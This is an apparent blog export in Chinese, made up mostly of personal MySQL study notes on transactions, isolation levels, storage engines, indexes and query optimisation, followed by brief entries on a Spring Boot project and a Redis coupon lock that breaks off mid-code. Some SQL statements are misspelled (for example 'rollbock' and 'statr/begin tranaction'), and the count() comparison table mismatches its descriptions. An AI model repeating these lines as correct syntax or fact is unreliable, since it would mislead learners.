<li>提高了自己的动手能力，以及编程能力，加深了对thinkPHP框架的了解，明白了其运行原理，学会了如何编辑一个CMS网站</li>
<li>在编写漏洞的过程中也提高了自己对改漏洞的理解，在以后的学习和工作中能更好的利用和防御漏洞</li>
<li>锻炼了自己的学习能力，从一开始的无从下手，后来通过手册学习后，了解了网站的框架，到后来可以自如的修改网站的页面和后端逻辑代码，对自己的学习能力提升很大，这也是这门课程的重要意义。毕竟学习安全，很多东西是需要自己摸索的，具备独立学习的能力才能在安全的道路上走的更远。</li>
</ul>
]]></content>
      <tags>
        <tag>thinkPHP,cms</tag>
      </tags>
  </entry>
  <entry>
    <title>MySql进阶学习</title>
    <url>/2022/09/27/mysql/</url>
    <content><![CDATA[<h1 id="Mysql进阶学习"><a href="#Mysql进阶学习" class="headerlink" title="Mysql进阶学习"></a>Mysql进阶学习</h1><h2 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h2><blockquote>
<p>事务 是一组操作的集合，它是一个不可分割的工作单位，事务会把所有的操作作为一个整体一起向系</p>
<p>统提交或撤销操作请求，即这些操作要么同时成功，要么同时失败。</p>
<p>就比如: 张三给李四转账1000块钱，张三银行账户的钱减少1000，而李四银行账户的钱要增加</p>
<p>1000。 这一组操作就必须在一个事务的范围内，要么都成功，要么都失败。</p>
</blockquote>
<p>数据的准备</p>
<pre><code class="hljs mysql">drop table if exists account;
create table account
(
    id    int primary key AUTO_INCREMENT comment &#x27;ID&#x27;,
    name  varchar(10) comment &#x27;姓名&#x27;,
    money double(10, 2) comment &#x27;余额&#x27;
) comment &#x27;账户表&#x27;;
insert into account(name, money)
VALUES (&#x27;张三&#x27;, 2000),
       (&#x27;李四&#x27;, 2000);</code></pre>



<p>正常的操作下表数据的变化</p>
<pre><code class="hljs mysql">select * from account;

select * from account where name = &#x27;张三&#x27;;

update account set money = money - 1000 where id = 1;

update account set money = money + 1000 where id = 2;</code></pre>



<p>操作异常情况下的数据情况</p>
<pre><code class="hljs mysql">update account set money = money - 1000 where id = 1;
error
update account set money = money + 1000 where id = 2;</code></pre>

<p>在此情况下，第二句sql无法执行到</p>
<p>这样就会导致张三用户账户的钱少了，但是李四账号并没有收到钱，那么就会出现问题。</p>
<h3 id="手动控制事务"><a href="#手动控制事务" class="headerlink" title="手动控制事务"></a>手动控制事务</h3><p>1).查看&#x2F;设置事务提交方式</p>
<pre><code class="hljs mysql">select @@autocommit;

set @@autocommit = 0;</code></pre>

<p><img src="/2022/09/27/mysql/OneDrive%20-%20cumt.edu.cn/LAB/note/mysql.assets/image-20220922154213267.png" alt="image-20220922154213267"></p>
<p>2).提交事务</p>
<pre><code class="hljs mysql">commit;</code></pre>

<p>3).事务回滚</p>
<pre><code class="hljs abnf">rollback<span class="hljs-comment">;</span></code></pre>

<blockquote>
<p>上面的过程是将事务的提交设置为手动提交，此时我们执行的DML语句都不会提交, 需要手动的执行commit进行提交。</p>
</blockquote>
<h3 id="自动控制事务"><a href="#自动控制事务" class="headerlink" title="自动控制事务"></a>自动控制事务</h3><p>1).开启事务</p>
<pre><code class="hljs mysql">statr/begin tranaction</code></pre>

<p>2).提交事务</p>
<pre><code class="hljs mysql">commit；</code></pre>

<p>3).事务回滚</p>
<pre><code class="hljs mysql">rollbock;</code></pre>

<p>转账案例实现</p>
<pre><code class="hljs mysql">start transaction;
-- 从张三账户中转出钱
update account set money = money - 1000 where id = 1;
-- 向李四账号中转入钱
update account set money = money + 1000 where id = 2;

-- 执行完毕，提交事务
commit;</code></pre>

<h3 id="事务四大特性"><a href="#事务四大特性" class="headerlink" title="事务四大特性"></a>事务四大特性</h3><ul>
<li><p>原子性（Atomicity）：事务是不可分割的最小操作单元，要么全部成功，要么全部失败。</p>
</li>
<li><p>一致性（Consistency）：事务完成时，必须使所有的数据都保持一致状态。</p>
</li>
<li><p>隔离性（Isolation）：数据库系统提供的隔离机制，保证事务在不受外部并发操作影响的独立</p>
</li>
</ul>
<p>环境下运行。</p>
<ul>
<li>持久性（Durability）：事务一旦提交或回滚，它对数据库中的数据的改变就是永久的。</li>
</ul>
<p>上述就是事务的四大特性，简称ACID。 </p>
<h3 id="并发事务产生的问题"><a href="#并发事务产生的问题" class="headerlink" title="并发事务产生的问题"></a>并发事务产生的问题</h3><p>1). 赃读：一个事务读到另外一个事务还没有提交的数据</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220922155417574.png" alt="image-20220922155417574"></p>
<p>2). 不可重复读：一个事务先后读取同一条记录，但两次读取的数据不同，称之为不可重复读。</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220922155423618.png" alt="image-20220922155423618"></p>
<p>3). 幻读：一个事务按照条件查询数据时，没有对应的数据行，但是在插入数据时，又发现这行数据</p>
<p>已经存在，好像出现了 “幻影”。</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220922155433815.png" alt="image-20220922155433815"></p>
<h3 id="事务的隔离级别"><a href="#事务的隔离级别" class="headerlink" title="事务的隔离级别"></a>事务的隔离级别</h3><p>为了解决事务并发产生的问题，在数据库中引入了事务隔离级别。主要有以下四种：</p>
<table>
<thead>
<tr>
<th>隔离级别</th>
<th>脏读</th>
<th>不可重复度</th>
<th>幻读</th>
</tr>
</thead>
<tbody><tr>
<td>Read uncommited(读未提交)</td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>Read commited(读已提交)</td>
<td>×</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>Repeatable Read(默认)</td>
<td>×</td>
<td>×</td>
<td>√</td>
</tr>
<tr>
<td>Serializable(串行化)</td>
<td>×</td>
<td>×</td>
<td>×</td>
</tr>
</tbody></table>
<p>1). 查看事务的隔离级别</p>
<pre><code class="hljs mysql">SELECT @@TRANSACTION_ISOLATION;</code></pre>

<p>Mysql默认使用的是<code>Repeatable Read</code></p>
<p><img src="/2022/09/27/mysql/OneDrive%20-%20cumt.edu.cn/LAB/note/mysql.assets/image-20220922160058646.png" alt="image-20220922160058646"></p>
<p>2).设置事务隔离级别</p>
<pre><code class="hljs mysql">SET [ SESSION | GLOBAL ] TRANSACTION ISOLATION LEVEL &#123; READ UNCOMMITTED | READ COMMITTED | REPEATABLE READ | SERIALIZABLE &#125;

-- session是设置当前会话即当前连接的终端的隔离级别
-- GLOBAL是设置所有会话的隔离级别
</code></pre>

<blockquote>
<p>注意：事务的隔离级别越高其性能越低</p>
</blockquote>
<h2 id="存储引擎"><a href="#存储引擎" class="headerlink" title="存储引擎"></a>存储引擎</h2><p>查看当前数据库支持的存储引擎</p>
<pre><code class="hljs mysql">show engines</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220922150430705.png" alt="image-20220922150430705"></p>
<p>当创建表时默认使用InnoDB存储引擎</p>
<pre><code class="hljs sql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> tb_user;</code></pre>

<p><img src="/2022/09/27/mysql/OneDrive%20-%20cumt.edu.cn/LAB/note/mysql.assets/image-20220922150801513.png" alt="image-20220922150801513"></p>
<p>创建数据表时指定数据引擎，添加参数<code>engine=存储引擎名</code></p>
<pre><code class="hljs mysql">create table my_myisam
(
    id   int,
    name varchar(10)
) engine = MyISAM;


create table my_myisam
(
    id   int,
    name varchar(10)
) engine = Memory;</code></pre>

<h3 id="InnoDB"><a href="#InnoDB" class="headerlink" title="InnoDB"></a><strong>InnoDB</strong></h3><p>1). 介绍</p>
<p>InnoDB是一种兼顾高可靠性和高性能的通用存储引擎，在 MySQL 5.5 之后，InnoDB是默认的MySQL 存储引擎。</p>
<p>2). 特点</p>
<ul>
<li>DML操作遵循ACID模型，支持事务；</li>
<li>行级锁，提高并发访问性能；</li>
<li>支持外键FOREIGN KEY约束，保证数据的完整性和正确性；</li>
</ul>
<p>3).逻辑存储结构</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220922151214606.png" alt="image-20220922151214606"></p>
<h3 id="MyISAM"><a href="#MyISAM" class="headerlink" title="MyISAM"></a><strong>MyISAM</strong></h3><p>1). 介绍</p>
<p>MyISAM是MySQL早期的默认存储引擎。</p>
<p>2). 特点</p>
<ul>
<li><p>不支持事务，不支持外键</p>
</li>
<li><p>支持表锁，不支持行锁</p>
</li>
<li><p>访问速度快</p>
</li>
</ul>
<h3 id="Memory"><a href="#Memory" class="headerlink" title="Memory"></a><strong>Memory</strong></h3><p>1). 介绍</p>
<p>Memory引擎的表数据时存储在内存中的，由于受到硬件问题、或断电问题的影响，只能将这些表作为临时表或缓存使用。</p>
<p>2). 特点</p>
<ul>
<li><p>内存存放</p>
</li>
<li><p>hash索引（默认）</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220922151341240.png" alt="image-20220922151341240"></p>
<blockquote>
<p>面试题:</p>
<p>InnoDB引擎与MyISAM引擎的区别 ? </p>
<p>①. InnoDB引擎, 支持事务, 而MyISAM不支持。</p>
<p>②. InnoDB引擎, 支持行锁和表锁, 而MyISAM仅支持表锁, 不支持行锁。</p>
<p>③. InnoDB引擎, 支持外键, 而MyISAM是不支持的。</p>
<p>主要是上述三点区别，当然也可以从索引结构、存储限制等方面，更加深入的回答，具体参</p>
<p>考如下官方文档：</p>
<p><strong><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-introduction.html">https://dev.mysql.com/doc/refman/8.0/en/innodb-introduction.html</a></strong></p>
<p><strong><a href="https://dev.mysql.com/doc/refman/8.0/en/myisam-storage-engine.html">https://dev.mysql.com/doc/refman/8.0/en/myisam-storage-engine.html</a></strong></p>
</blockquote>
<p><strong>存储引擎的选择</strong></p>
<p>在选择存储引擎时，应该根据应用系统的特点选择合适的存储引擎。</p>
<ul>
<li>InnDB:是mysql的默认存储引擎，支持事务、外键。如果应用对事务的完整性要求比较高，在并发条件下要求数据的一致性的情况下应该选择此存储引擎。</li>
<li>MyISAM: 如果应用是以读取和插入操作为主 ，只有少量的删除和更新操作，并且对事务的完整性，并发性要求不是很高，那么选择此存储引擎合适</li>
<li>Memory: 将所有数据保存在内存中， 访问速度快，通常用于临时表和缓存。但是由于存放在内存中其受到的限制也很多，如表的大小限制，无法对过大的表进行缓存，还有安全性问题，如断电时数据丢失。</li>
</ul>
<h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p><strong>介绍</strong></p>
<blockquote>
<p>索引（index）是帮助MySQL高效获取数据的数据结构(有序)。在数据之外，数据库系统还维护着满足</p>
<p>特定查找算法的数据结构，这些数据结构以某种方式引用（指向）数据， 这样就可以在这些数据结构</p>
<p>上实现高级查找算法，这种数据结构就是索引。</p>
</blockquote>
<h3 id="索引结构"><a href="#索引结构" class="headerlink" title="索引结构"></a><strong>索引结构</strong></h3><p>MySQL的索引是在存储引擎层实现的，不同的存储引擎有不同的索引结构，主要包含以下几种：</p>
<table>
<thead>
<tr>
<th>索引结构</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>B+tree</td>
<td>最常见的索引类型，大部分引擎都支持 B+ 树索引</td>
</tr>
<tr>
<td>Hash索引</td>
<td>底层数据结构是用哈希表实现的, 只有精确匹配索引列的查询才有效, 不支持范围查询</td>
</tr>
<tr>
<td>R-tree(空间索引）</td>
<td>空间索引是MyISAM引擎的一个特殊索引类型，主要用于地理空间数据类型，通常使用较少</td>
</tr>
<tr>
<td>Full-text(全文索引)</td>
<td>是一种通过建立倒排索引,快速匹配文档的方式。类似于Lucene,Solr,ES</td>
</tr>
</tbody></table>
<p>存储引擎对于索引结构的支持情况</p>
<table>
<thead>
<tr>
<th>索引</th>
<th>InnoDB</th>
<th>MyISAM</th>
<th>Memory</th>
</tr>
</thead>
<tbody><tr>
<td>B+tree</td>
<td>支持</td>
<td>支持</td>
<td>支持</td>
</tr>
<tr>
<td>Hash索引</td>
<td>不支持</td>
<td>不支持</td>
<td>支持</td>
</tr>
<tr>
<td>R-tree</td>
<td>不支持</td>
<td>支持</td>
<td>不支持</td>
</tr>
<tr>
<td>Full-text</td>
<td>5.6版本之后支持</td>
<td>支持</td>
<td>不支持</td>
</tr>
</tbody></table>
<h3 id="B-tree"><a href="#B-tree" class="headerlink" title="B-tree"></a>B-tree</h3><blockquote>
<p>B-Tree，B树是一种多叉路衡查找树，相对于二叉树，B树每个节点可以有多个分支，即多叉。以一颗最大度数（max-degree）为5(5阶)的b-tree为例，那这个B树每个节点最多存储4个key，5个指针</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220922171802873.png" alt="image-20220922171802873"></p>
<h3 id="B-Tree"><a href="#B-Tree" class="headerlink" title="B+Tree"></a>B+Tree</h3><blockquote>
<p>B+Tree是B-Tree的变种，我们以一颗最大度数（max-degree）为4（4阶）的b+tree为例，其结构示意图：</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220922171908681.png" alt="image-20220922171908681"></p>
<ul>
<li>绿色框框起来的部分，是索引部分，仅仅起到索引数据的作用，不存储数据。</li>
<li>红色框框起来的部分，是数据存储部分，在其叶子节点中要存储具体的数据。</li>
</ul>
<p>B+Tree 与 B-Tree相比，主要有以下三点区别：</p>
<ul>
<li><p>所有的数据都会出现在叶子节点。</p>
</li>
<li><p>叶子节点形成一个单向链表。</p>
</li>
<li><p>非叶子节点仅仅起到索引数据作用，具体的数据都是在叶子节点存放的。</p>
</li>
</ul>
<p>MySQL索引数据结构对经典的B+Tree进行了优化。在原B+Tree的基础上，增加一个指向相邻叶子节点</p>
<p>的链表指针，就形成了带有顺序指针的B+Tree，提高区间访问的性能，利于排序。</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220923112657769.png" alt="image-20220923112657769"></p>
<h3 id="Hash索引"><a href="#Hash索引" class="headerlink" title="Hash索引"></a>Hash索引</h3><p>哈希索引就是采用一定的hash算法，将键值换算成新的hash值，映射到对应的槽位上，然后存储在hash表中。Java中的HashMap结构类似(树加链表的实现方式)。如果两个(或多个)键值，映射到一个相同的槽位上，他们就产生了hash冲突（也称为hash碰撞），可以通过链表来解决。</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220923113007344.png" alt="image-20220923113007344"></p>
<p>特点</p>
<ul>
<li><p>Hash索引只能用于对等比较(&#x3D;，in)，不支持范围查询（between，&gt;，&lt; ，…）</p>
</li>
<li><p>无法利用索引完成排序操作</p>
</li>
<li><p>查询效率高，通常(不存在hash冲突的情况)只需要一次检索就可以了，效率通常要高于B+tree索 引</p>
</li>
</ul>
<blockquote>
<p>为什么InnDB选择B+Tree作为索引结构</p>
<ul>
<li>相比较二叉树，其层级更少，搜索效率更高</li>
<li>于B-tree，无论是叶子节点还是非叶子节点，都会保存数据，这样导致一页中存储的键值减少，指针跟着减少，要同样保存大量数据，只能增加树的高度，导致性能降低；</li>
<li>相对Hash索引，B+tree支持范围匹配及排序操作</li>
</ul>
</blockquote>
<h2 id="索引分类"><a href="#索引分类" class="headerlink" title="索引分类"></a>索引分类</h2><p>在MySQL数据库，将索引的具体类型主要分为以下几类：主键索引、唯一索引、常规索引、全文索引。</p>
<table>
<thead>
<tr>
<th>分类</th>
<th>含义</th>
<th>特点</th>
<th>关键字</th>
</tr>
</thead>
<tbody><tr>
<td>主键索引</td>
<td>针对表中主键创建的索引</td>
<td>默认自动创建，只能有一个</td>
<td>primary</td>
</tr>
<tr>
<td>唯一索引</td>
<td>避免表中某 数据列的值重复</td>
<td>可以有多个</td>
<td>UNIQUE</td>
</tr>
<tr>
<td>常规索引</td>
<td>快速定位数据</td>
<td>可以有多个</td>
<td></td>
</tr>
<tr>
<td>全文索引</td>
<td>全文索引查找的是文中的关键字，而不是比较索引的值</td>
<td>可以有多个</td>
<td>FULLTEXT</td>
</tr>
</tbody></table>
<h3 id="聚集索引和二级索引"><a href="#聚集索引和二级索引" class="headerlink" title="聚集索引和二级索引"></a>聚集索引和二级索引</h3><p>InnDB存储引擎中，根据索引的存储形式，又可以分为以下两种：</p>
<table>
<thead>
<tr>
<th>分类</th>
<th>含义</th>
<th>特点</th>
</tr>
</thead>
<tbody><tr>
<td>聚集索引(Clustered Index)</td>
<td>将数据存储与索引放到一块，索引结构的叶子节点保存到行数据</td>
<td>必须有且只有一个</td>
</tr>
<tr>
<td>二级索引</td>
<td>将数据与索引分开存储，索引结构的叶子节点关联是对应的主键</td>
<td>可以 存放很多个</td>
</tr>
</tbody></table>
<p>聚集索引选取规则：</p>
<ul>
<li>如果存在主键，主键索引就是聚集索引</li>
<li>如果不存在主键，将使用第一个唯一(UNIQUE)索引作为聚集索引</li>
<li>如果表没有主键，或没有合适的唯一索引，则InnoDB会自动生成一个rowid作为隐藏的聚集索引。</li>
</ul>
<p>聚集索引与二级索引的结构如下：</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220923121417420.png" alt="image-20220923121417420"></p>
<p>当执行</p>
<pre><code class="hljs mysql">select * from user where name = &#x27;Arm&#x27;;</code></pre>

<p>通过二级索引获取到其对应的主键索引，再到聚集索引中获取所有的行数据，这种查询过程叫做回表查询。</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220923121626216.png" alt="image-20220923121626216"></p>
<p>上述查询详细查询过程如下：</p>
<ul>
<li><p>由于是根据name字段进行查询，所以先根据name&#x3D;’Arm’到name字段的二级索引中进行匹配查找。但是在二级索引中只能查找到 Arm 对应的主键值 10。</p>
</li>
<li><p>由于查询的字段是*，二级索引中没有该字段，所以此时需要根据二级索引中存储的主键id &#x3D; 10去聚集索引中查询</p>
</li>
<li><p>最后获取主键为10的行，返回所有数据</p>
</li>
</ul>
<p>InnoDB存储引擎最小的存储单元-页(16K)，那么高度为2的B+tree树能存储多少条数据？</p>
<blockquote>
<p>这里我们<code>先假设B+树高为2</code>，即存在一个根节点和若干个叶子节点，那么这棵B+树的存放总记录数为：根节点指针数*单个叶子节点记录行数。</p>
<p>上文我们已经说明单个叶子节点（页）中的记录数&#x3D;16K&#x2F;1K&#x3D;16。（这里假设一行记录的数据大小为1k，<code>实际上</code>现在很多互联网业务<code>数据记录大小通常就是1K左右</code>）。</p>
<p>那么现在我们需要计算出<code>非叶子节点能存放多少指针</code>，其实这也很好算，我们假设<code>主键ID为bigint类型，长度为8字节</code>，而<code>指针大小</code>在InnoDB源码中设置为<code>6字节</code>，这样一共14字节，我们一个页中能存放多少这样的单元，其实就代表有多少指针，即<code>16384/14=1170</code>。那么可以算出一棵<code>高度为2的B+树</code>，能存放<code>1170*16=18720条</code>这样的数据记录。</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220923124545908.png" alt="image-20220923124545908"></p>
</blockquote>
<h3 id="索引语法"><a href="#索引语法" class="headerlink" title="索引语法"></a>索引语法</h3><ol>
<li><p>创建索引</p>
<pre><code class="hljs mysql">CREATE [ UNIQUE | FULLTEXT ] INDEX index_name ON table_name ( index_col_name,... );</code></pre>
</li>
<li><p>查看索引</p>
<pre><code class="hljs mysql">show INDEX in account;</code></pre>
</li>
<li><p>删除索引</p>
<pre><code class="hljs mysql">DROP INDEX index_name ON table_name ;</code></pre></li>
</ol>
<p>索引的使用</p>
<ul>
<li><p>name字段为姓名字段，该字段的值可能会重复，为该字段创建索引</p>
<pre><code class="hljs mysql">CREATE INDEX idx_user_name ON tb_user(name);</code></pre>
</li>
<li><p>phone手机号字段的值，是非空，且唯一的，为该字段创建唯一索引。</p>
<pre><code class="hljs mysql">CREATE UNIQUE INDEX  idx_user_phone ON tb_user(phone);</code></pre>
</li>
<li><p>为profession、age、status创建联合索引。</p>
<pre><code class="hljs mysql">CREATE INDEX idx_user_profession_age_status ON tb_user(profession, age, status);</code></pre>
</li>
<li><p>为email建立合适的索引来提升查询效率</p>
<pre><code class="hljs mysql">CREATE INDEX idx_user_email ON tb_user(email);</code></pre></li>
</ul>
<p>查看表中已创建的索引</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220923130559040.png" alt="image-20220923130559040"></p>
<h2 id="SQL性能分析"><a href="#SQL性能分析" class="headerlink" title="SQL性能分析"></a>SQL性能分析</h2><h3 id="SQL的执行频次"><a href="#SQL的执行频次" class="headerlink" title="SQL的执行频次"></a>SQL的执行频次</h3><pre><code class="hljs mysql">SHOW GLOBAL  STATUS LIKE &#x27;Com_____&#x27;;
SHOW SESSION  STATUS LIKE &#x27;Com_____&#x27;;</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220923131257200.png" alt="image-20220923131257200"></p>
<h3 id="慢查询日志"><a href="#慢查询日志" class="headerlink" title="慢查询日志"></a>慢查询日志</h3><p>慢查询日志记录了所有执行时间超过指定参数（long_query_time，单位：秒，默认10秒）的所有SQL语句的日志。</p>
<p>MySQL的慢查询日志默认没有开启，我们可以查看一下系统变量 slow_query_log。</p>
<p>开启<code>slow_query_log</code>(默认关闭)，在mysql配置文件中添加以下配置</p>
<pre><code class="hljs ini"><span class="hljs-attr">slow_query_log</span> = <span class="hljs-number">1</span> 
<span class="hljs-attr">long_query_time</span>= <span class="hljs-number">2</span> <span class="hljs-comment"># 当查询时间超过两秒时，会被记录</span></code></pre>



<h3 id="profile详情"><a href="#profile详情" class="headerlink" title="profile详情"></a>profile详情</h3><p>show profiles 能够在做SQL优化时帮助我们了解时间都耗费到哪里去了。通过have_profiling参数，能够看到当前MySQL是否支持profile操作：</p>
<pre><code class="hljs mysql">SHOW @@hava_profiling;</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220923132917533.png" alt="image-20220923132917533"></p>
<p>如果没有开启，则可以使用以下语句开启</p>
<pre><code class="hljs mysql">set profiling  = 1</code></pre>

<p>执行一系列的业务SQL的操作，然后通过如下指令查看指令的执行耗时：</p>
<pre><code class="hljs mysql">-- 查看每一条SQL的耗时基本情况 
show profiles; 
-- 查看指定query_id的SQL语句各个阶段的耗时情况 
show profile for query query_id; 
-- 查看指定query_id的SQL语句CPU的使用情况 
show profile cpu for query query_id;</code></pre>

<h3 id="最左前缀法则"><a href="#最左前缀法则" class="headerlink" title="最左前缀法则"></a>最左前缀法则</h3><p>如果索引了多列（联合索引），要遵守最左前缀法则。最左前缀法则指的是查询从索引的最左列开始，并且不跳过索引中的列。如果跳跃某一列，索引将会部分失效(后面的字段索引失效)。</p>
<h3 id="覆盖索引"><a href="#覆盖索引" class="headerlink" title="覆盖索引"></a>覆盖索引</h3><p>尽量使用覆盖索引，减少select *。 那么什么是覆盖索引呢？ 覆盖索引是指 查询使用了索引，并且需要返回的列，在该索引中已经全部能够找到 。</p>
<p>使用覆盖索引可以避免回表查询，提高sql查询的效率。</p>
<h3 id="索引设计原则"><a href="#索引设计原则" class="headerlink" title="索引设计原则"></a>索引设计原则</h3><blockquote>
<p>1). 针对于数据量较大，且查询比较频繁的表建立索引。</p>
<p>2). 针对于常作为查询条件（where）、排序（order by）、分组（group	 by）操作的字段建立索引。</p>
<p>3). 尽量选择区分度高的列作为索引，尽量建立唯一索引，区分度越高，使用索引的效率越高。</p>
<p>4). 如果是字符串类型的字段，字段的长度较长，可以针对于字段的特点，建立前缀索引。</p>
<p>5). 尽量使用联合索引，减少单列索引，查询时，联合索引很多时候可以覆盖索引，节省存储空间，避免回表，提高查询效率。</p>
<p>6). 要控制索引的数量，索引并不是多多益善，索引越多，维护索引结构的代价也就越大，会影响增删改的效率。</p>
<p>create unique index idx_user_phone_name on tb_user(phone,name); </p>
<p>7). 如果索引列不能存储NULL值，请在创建表时使用NOT NULL约束它。当优化器知道每列是否包含NULL值时，它可以更好地确定哪个索引最有效地用于查询。</p>
</blockquote>
<h2 id="SQL优化"><a href="#SQL优化" class="headerlink" title="SQL优化"></a>SQL优化</h2><h3 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h3><p>如果我们需要一次性往数据库表中插入多条记录，可以从以下三个方面进行优化。</p>
<ul>
<li><p>1). 优化方案一</p>
<pre><code>  批量插入数据
</code></pre>
</li>
<li><p>2). 优化方案二</p>
<pre><code>  手动控制事务
</code></pre>
</li>
<li><p>3). 优化方案三</p>
<p>主键顺序插入，性能要高于乱序插入</p>
<p>如果一次性需要插入大批量数据(比如: 几百万的记录)，使用insert语句插入性能较低，此时可以使</p>
<p>用MySQL数据库提供的load指令进行插入。</p>
<pre><code class="hljs mysql">-- 客户端连接服务端时，加上参数 -–local-infile 
mysql –-local-infile -u root -p 
-- 设置全局参数local_infile为1，开启从本地加载文件导入数据的开关 
set global local_infile = 1; 
-- 执行load指令将准备好的数据，加载到表结构中 
load data local infile &#x27;/root/sql1.log&#x27; into table tb_user fields terminated by &#x27;,&#x27; lines terminated by &#x27;\n&#x27; ;</code></pre>
</li>
<li><p>4).主键顺序插入，性能要高于乱序插入</p>
</li>
</ul>
<h3 id="主键优化"><a href="#主键优化" class="headerlink" title="主键优化"></a>主键优化</h3><ul>
<li>满足业务需求的情况下，尽量降低主键的长度。</li>
<li>插入数据时，尽量选择顺序插入，选择使用AUTO_INCREMENT自增主键。</li>
<li>尽量不要使用UUID做主键或者是其他自然主键，如身份证号。</li>
<li>业务操作时，避免对主键的修改。</li>
</ul>
<h3 id="order-by优化"><a href="#order-by优化" class="headerlink" title="order by优化"></a>order by优化</h3><p>MySQL的排序，有两种方式：</p>
<ul>
<li><p>Using filesort : 通过表的索引或全表扫描，读取满足条件的数据行，然后在排序缓冲区sortbuffer中完成排序操作，所有不是通过索引直接返回排序结果的排序都叫 FileSort 排序。</p>
</li>
<li><p>Using index : 通过有序索引顺序扫描直接返回有序数据，这种情况即为 using index，不需要额外排序，操作效率高。</p>
</li>
</ul>
<p>对于以上的两种排序方式，Using index的性能高，而Using filesort的性能低，我们在优化排序操作时，尽量要优化为 Using index。</p>
<p>order by优化原则:</p>
<ul>
<li>A. 根据排序字段建立合适的索引，多字段排序时，也遵循最左前缀法则。</li>
<li>B. 尽量使用覆盖索引。</li>
<li>C. 多字段排序, 一个升序一个降序，此时需要注意联合索引在创建时的规则（ASC&#x2F;DESC）。</li>
<li>D. 如果不可避免的出现filesort，大数据量排序时，可以适当增大排序缓冲区大小</li>
<li>sort_buffer_size(默认256k)。</li>
</ul>
<h3 id="group-by优化"><a href="#group-by优化" class="headerlink" title="group by优化"></a>group by优化</h3><p>在分组操作中，我们需要通过以下两点进行优化，以提升性能：</p>
<ul>
<li><p>A. 在分组操作时，可以通过索引来提高效率。</p>
</li>
<li><p>B. 分组操作时，索引的使用也是满足最左前缀法则的。</p>
</li>
</ul>
<h3 id="limit优化"><a href="#limit优化" class="headerlink" title="limit优化"></a>limit优化</h3><p>优化思路: 一般分页查询时，通过创建 覆盖索引 能够比较好地提高性能，可以通过覆盖索引加子查询形式进行优化。</p>
<h3 id="count优化"><a href="#count优化" class="headerlink" title="count优化"></a>count优化</h3><p><strong>count的工作原理</strong></p>
<blockquote>
<p>MyISAM 引擎把一个表的总行数存在了磁盘上，因此执行 count(*) 的时候会直接返回这个数，效率很高； 但是如果是带条件的count，MyISAM也慢。</p>
<p>InnoDB 引擎就麻烦了，它执行 count(*) 的时候，需要把数据一行一行地从引擎里面读出来，然后累积计数。</p>
</blockquote>
<p><strong>count的用法</strong></p>
<p>count() 是一个聚合函数，对于返回的结果集，一行行地判断，如果 count 函数的参数不是NULL，累计值就加 1，否则不加，最后返回累计值。</p>
<p>用法：count（*）、count（主键）、count（字段）、count（数字）</p>
<table>
<thead>
<tr>
<th>count用法</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td>count(主键)</td>
<td align="left">InnoDB 引擎会遍历整张表，把每一行的 主键id 值都取出来，返回给服务层。服务层拿到主键后，直接按行进行累加(主键不可能为null)。</td>
</tr>
<tr>
<td>count(*)</td>
<td align="left">没有not null 约束: InnoDB 引擎会遍历整张表把每一行的字段值都取出来，返回给服务层，服务层判断是否为null，不为null，计数累加。<br>有not null 约束: InnoDB引擎会遍历整张表把每一行的字段值都取出来，返回给服务层，直接按行进行累加。</td>
</tr>
<tr>
<td>count(字段)</td>
<td align="left">InnoDB 引擎遍历整张表，但不取值。服务层对于返回的每一行，放一个数字’1’进去，直接按行进行累加。</td>
</tr>
<tr>
<td>count(数字)</td>
<td align="left">InnoDB引擎并不会把全部字段取出来，而是专门做了优化，不取值，服务层直接按行累加。</td>
</tr>
</tbody></table>
<p>按照效率排序的话，count(字段) &lt; count(主键 id) &lt; count(1) ≈ count(*)，所以尽量使用 count(*)。 </p>
]]></content>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>reggie</title>
    <url>/2022/04/29/reggie/</url>
    <content><![CDATA[<h1 id="瑞吉外卖项目"><a href="#瑞吉外卖项目" class="headerlink" title="瑞吉外卖项目"></a>瑞吉外卖项目</h1><p>黑马程序员最新的springboot课程中的项目</p>
<p>项目地址为 <a href="https://github.com/sunzhengyu99/reggie">瑞吉</a></p>
<p>代码全是跟着视频敲出来的，后面会对项目进行优化。</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>springboot</tag>
      </tags>
  </entry>
  <entry>
    <title>redis_application</title>
    <url>/2023/01/06/redis-application/</url>
    <content><![CDATA[<p>优惠券秒杀实现</p>
<h1 id="redis实现分布式锁"><a href="#redis实现分布式锁" class="headerlink" title="redis实现分布式锁"></a>redis实现分布式锁</h1><ul>
<li>指定时间范围内</li>
<li>一人一单</li>
</ul>
<p>创建购买优惠券订单的代码如下</p>
<pre><code class="hljs java"><span class="hljs-meta">@Transactional</span>
